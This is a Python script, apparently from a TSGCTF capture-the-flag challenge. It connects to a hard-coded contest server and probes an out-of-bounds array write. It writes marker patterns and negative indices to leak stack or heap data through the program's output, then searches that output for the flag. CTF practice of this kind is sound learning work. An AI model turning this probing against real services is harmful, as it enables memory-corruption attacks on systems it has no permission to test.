#!/usr/bin/env python3
"""
Check if we can exploit by reading the array values after writing them
Maybe we can use the printf at the end to leak data?
"""
import socket
import time

s = socket.socket()
s.settimeout(15)
s.connect(('34.84.25.24', 58554))

print("[*] Connected. Testing if we can leak via array print...")

# Strategy: Don't overwrite anything dangerous, just read what server gives us
# Exit immediately and see the array output

s.recv(4096)
s.sendall(b"-1\n")  # Exit immediately
time.sleep(1)

output = s.recv(8192)
print("\n" + "="*60)
print("Initial output:")
print("="*60)
print(output.decode(errors='ignore'))

s.close()

# Now try writing some recognizable pattern and reading back
print("\n[*] Testing write-then-read pattern...")
s = socket.socket()
s.settimeout(15)
s.connect(('34.84.25.24', 58554))

# Write pattern to array
for i in range(16):
    s.recv(4096)
    s.sendall(f"{i}\n".encode())
    time.sleep(0.05)
    s.recv(4096)
    s.sendall(f"{0x41414141 + i}\n".encode())  # "AAAA", "BBBB", etc
    time.sleep(0.05)

# Exit and read
s.recv(4096)
s.sendall(b"-1\n")
time.sleep(1)

output = s.recv(8192)
print("\n" + "="*60)
print("After writing pattern:")
print("="*60)
print(output.decode(errors='ignore'))

s.close()

# Try reading negative indices (leak stack/heap?)
print("\n[*] Trying to leak via negative array writes...")
s = socket.socket()
s.settimeout(15)
s.connect(('34.84.25.24', 58554))

# Write to negative indices and see if they appear in output
for i in range(-10, 0):
    s.recv(4096)
    s.sendall(f"{i}\n".encode())
    time.sleep(0.05)
    s.recv(4096)
    s.sendall(f"{0x42424242 + i}\n".encode())
    time.sleep(0.05)

s.recv(4096)
s.sendall(b"-1\n")
time.sleep(1)

output = s.recv(8192)
print("\n" + "="*60)
print("After writing negative indices:")
print("="*60)
print(output.decode(errors='ignore'))

# Check if flag appears
if b'TSGCTF{' in output:
    print("\n[+] FLAG FOUND!")
    start = output.find(b'TSGCTF{')
    end = output.find(b'}', start) + 1
    print(f"[+] {output[start:end].decode()}")

s.close()
